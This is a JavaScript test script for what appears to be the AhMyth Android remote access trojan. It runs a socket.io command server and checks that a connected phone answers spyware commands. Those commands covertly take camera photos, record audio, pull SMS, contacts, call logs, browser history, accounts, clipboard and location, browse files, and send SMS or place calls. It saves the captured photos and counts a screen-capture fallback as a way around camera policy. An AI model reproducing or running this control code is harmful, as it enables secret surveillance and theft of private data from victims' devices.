const { Server } = require('socket.io');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');

// Configuration
const PORT = 1234;
const TEST_TIMEOUT = 15000;
const TOTAL_TIMEOUT = 300000;

// Colors for output
const colors = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    cyan: "\x1b[36m",
    magenta: "\x1b[35m",
    blue: "\x1b[34m"
};

function log(msg, type = 'info') {
    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
    let color = colors.reset;
    if (type === 'success') color = colors.green;
    if (type === 'error') color = colors.red;
    if (type === 'warn') color = colors.yellow;
    if (type === 'header') color = colors.cyan;
    if (type === 'detail') color = colors.blue;
    
    console.log(`${colors.magenta}[${timestamp}]${color} ${msg}${colors.reset}`);
}

// Test Definitions
const tests = [
    {
        id: 'connection',
        name: 'Client Connection',
        description: 'Verify client connects to server',
        command: null, // Initial connection
        verify: (data) => data.status === 'connected'
    },
    {
        id: 'camera_list',
        name: 'Camera List',
        description: 'Get list of available cameras',
        command: { order: 'x0000ca', extra: 'camList' },
        verify: (data) => data.camList === true && Array.isArray(data.list)
    },
    {
        id: 'camera_photo',
        name: 'Camera Photo (Back)',
        description: 'Take a photo with the back camera',
        command: { order: 'x0000ca', extra: '0', action: 'takePic', cameraID: 0 },
        verify: (data) => {
            if (data.bypass === true) {
                log('Camera blocked by policy - fell back to screen capture', 'warn');
                return true;
            }
            if (data.image === true && data.buffer) {
                log(`Received photo: ${Math.round(data.buffer.length/1024)} KB`, 'detail');
                fs.writeFileSync(`test_photo_${Date.now()}.jpg`, data.buffer);
                return true;
            }
            return false;
        }
    },
    {
        id: 'camera_photo_front',
        name: 'Camera Photo (Front)',
        description: 'Take a photo with the front camera',
        command: { order: 'x0000ca', extra: '1', action: 'takePic', cameraID: 1 },
        verify: (data) => {
            if (data.bypass === true) {
                log('Camera blocked by policy - fell back to screen capture', 'warn');
                return true;
            }
            if (data.image === true && data.buffer) {
                log(`Received photo: ${Math.round(data.buffer.length/1024)} KB`, 'detail');
                fs.writeFileSync(`test_photo_front_${Date.now()}.jpg`, data.buffer);
                return true;
            }
            return false;
        }
    },
    {
        id: 'browser_history',
        name: 'Browser History',
        description: 'Get browser history',
        command: { order: 'x0000bh', extra: 'history' },
        verify: (data) => data.history !== undefined || Array.isArray(data)
    },
    {
        id: 'browser_bookmarks',
        name: 'Browser Bookmarks',
        description: 'Get browser bookmarks',
        command: { order: 'x0000bh', extra: 'bookmarks' },
        verify: (data) => data.bookmarks !== undefined || Array.isArray(data)
    },
    {
        id: 'accounts',
        name: 'Accounts',
        description: 'Get device accounts',
        command: { order: 'x0000ac' },
        verify: (data) => Array.isArray(data) || (data && Array.isArray(data.accounts))
    },
    {
        id: 'make_call',
        name: 'Make Call',
        description: 'Initiate a phone call',
        command: { order: 'x0000mc2', phoneNumber: '5551234567' },
        verify: (data) => data.success === true || (data.error && data.error.includes('permission'))
    },
    {
        id: 'send_sms',
        name: 'Send SMS',
        description: 'Send an SMS message',
        command: { order: 'x0000sm', extra: 'sendSMS', to: '5551234567', sms: 'Test message from AhMyth' },
        verify: (data) => data === true
    },
    {
        id: 'file_manager',
        name: 'File Manager (Root)',
        description: 'List files in root directory',
        command: { order: 'x0000fm', extra: 'ls', path: '/' },
        verify: (data) => Array.isArray(data)
    },
    {
        id: 'sms_list',
        name: 'SMS List',
        description: 'Get SMS messages',
        command: { order: 'x0000sm', extra: 'ls' },
        verify: (data) => {
            if (Array.isArray(data)) return true;
            if (data && data.smsList && Array.isArray(data.smsList)) return true;
            return false;
        }
    },
    {
        id: 'contacts_list',
        name: 'Contacts List',
        description: 'Get contacts',
        command: { order: 'x0000cn' },
        verify: (data) => Array.isArray(data) || (data && Array.isArray(data.contactsList))
    },
    {
        id: 'call_logs',
        name: 'Call Logs',
        description: 'Get call logs',
        command: { order: 'x0000cl' },
        verify: (data) => {
            if (Array.isArray(data)) return true;
            if (data && data.callsList && Array.isArray(data.callsList)) return true;
            return false;
        }
    },
    {
        id: 'location',
        name: 'Location',
        description: 'Get device location',
        command: { order: 'x0000lm' },
        verify: (data) => {
            if (data.enable === false) {
                log('Location disabled on device', 'warn');
                return true; 
            }
            return data.lat !== undefined && data.lng !== undefined;
        }
    },
    {
        id: 'device_info',
        name: 'Device Info',
        description: 'Get basic device info',
        command: { order: 'x0000di' },
        verify: (data) => data.id !== undefined
    },
    {
        id: 'system_info',
        name: 'System Info (Full)',
        description: 'Get detailed system info',
        command: { order: 'x0000si', extra: 'all' },
        verify: (data) => data.system !== undefined
    },
    {
        id: 'wifi_info',
        name: 'WiFi Info',
        description: 'Get WiFi information',
        command: { order: 'x0000wf' },
        verify: (data) => data.enabled !== undefined
    },
    {
        id: 'clipboard',
        name: 'Clipboard',
        description: 'Get clipboard content',
        command: { order: 'x0000cb', extra: 'get' },
        verify: (data) => data.text !== undefined
    },
    {
        id: 'microphone',
        name: 'Microphone (Record)',
        description: 'Record audio for 2 seconds',
        command: { order: 'x0000mc', sec: 2 },
        verify: (data) => {
            if (data.file === true && data.buffer) {
                log(`Received audio: ${Math.round(data.buffer.length/1024)} KB`, 'detail');
                return true;
            }
            return false;
        }
    }
];

let server;
let ioServer;
let clientSocket;
let currentTestIndex = 0;
let testResults = {};

function runTestServer() {
    return new Promise((resolve, reject) => {
        log(`Starting test server on port ${PORT}...`, 'header');
        server = http.createServer();
        server.listen(PORT, '0.0.0.0');
        
        ioServer = new Server(server, {
            pingInterval: 25000,
            pingTimeout: 20000,
            allowEIO3: true, // Allow older clients
            cors: {
                origin: "*",
                methods: ["GET", "POST"]
            }
        });
        
        ioServer.on('connection', (socket) => {
            log(`Client connected: ${socket.id}`, 'success');
            clientSocket = socket;
            
            // Handle client identity
            socket.on('client_connected', (data) => {
                log(`Device identified: ${data.manufacturer} ${data.model} (Android ${data.androidVersion})`, 'info');
                
                // Mark connection test passed
                if (tests[0].id === 'connection') {
                    testResults['connection'] = { status: 'passed', response: 'Connected' };
                    currentTestIndex = 1;
                    runNextTest();
                }
            });
            
            // Generic handler for all events to catch responses
            const onevent = socket.onevent;
            socket.onevent = function (packet) {
                const args = packet.data || [];
                onevent.call(this, packet);    // original call
                const event = packet.data[0];
                const data = packet.data[1];
                
                // If we are running a test and this event matches expected response
                const currentTest = tests[currentTestIndex];
                if (currentTest && currentTest.command && currentTest.command.order === event) {
                    verifyTest(currentTest, data);
                }
            };
        });
        
        // Start timeout for total run
        setTimeout(() => {
            log('Total timeout reached', 'error');
            printSummary();
            process.exit(1);
        }, TOTAL_TIMEOUT);
    });
}

function runNextTest() {
    if (currentTestIndex >= tests.length) {
        printSummary();
        process.exit(0);
        return;
    }
    
    const test = tests[currentTestIndex];
    log(`Running Test ${currentTestIndex + 1}/${tests.length}: ${test.name}`, 'header');
    
    // Set up test timeout
    let testTimeout = setTimeout(() => {
        log(`[FAIL] ${test.name} timed out`, 'error');
        testResults[test.id] = { status: 'failed', error: 'Timeout', size: '0B' };
        
        // Move to next
        currentTestIndex++;
        runNextTest();
    }, TEST_TIMEOUT);
    
    // Store timeout to clear it if test passes
    test.timeoutObj = testTimeout;
    
    // Send command
    if (test.command) {
        if (clientSocket) {
            clientSocket.emit('order', test.command);
        } else {
            log('Client not connected!', 'error');
        }
    }
}

function verifyTest(test, data) {
    if (testResults[test.id]) return; // Already processed
    
    clearTimeout(test.timeoutObj);
    
    // Determine size
    let size = '0B';
    if (typeof data === 'string') size = `${data.length} chars`;
    else if (Buffer.isBuffer(data)) size = `${data.length} bytes`;
    else if (typeof data === 'object') size = `${JSON.stringify(data).length} bytes (approx)`;
    
    // Check validation
    let isValid = false;
    let type = 'valid';
    try {
        isValid = test.verify(data);
    } catch (e) {
        log(`Verification error: ${e.message}`, 'error');
        type = 'error';
    }
    
    if (data && data.error) {
        type = 'error_response';
        if (data.error.includes('permission')) type = 'permission_required';
    }
    
    if (isValid) {
        log(`[PASS] ${test.name}`, 'success');
        testResults[test.id] = { status: 'passed', size: size, type: type };
    } else {
        log(`[FAIL] ${test.name}`, 'error');
        testResults[test.id] = { status: 'failed', size: size, type: type, response: JSON.stringify(data).substring(0, 100) + '...' };
    }
    
    // Wait a bit before next test
    setTimeout(() => {
        currentTestIndex++;
        runNextTest();
    }, 1000);
}

function printSummary() {
    console.log('\n=== TEST SUMMARY ===');
    let passed = 0;
    let failed = 0;
    
    tests.forEach(test => {
        const result = testResults[test.id] || { status: 'skipped' };
        let icon = result.status === 'passed' ? '✓' : (result.status === 'skipped' ? '-' : '✗');
        let color = result.status === 'passed' ? colors.green : (result.status === 'skipped' ? colors.yellow : colors.red);
        
        console.log(`${color}${icon} ${test.name}${colors.reset}`);
        if (result.status === 'passed') {
            passed++;
            console.log(`   Type: ${result.type}, Size: ${result.size}`);
        } else if (result.status === 'failed') {
            failed++;
            console.log(`   Error: ${result.error || result.response}`);
        }
    });
    
    console.log(`\nTotal: ${tests.length}`);
    console.log(`Passed: ${passed}`);
    console.log(`Failed: ${failed}`);
}

runTestServer();

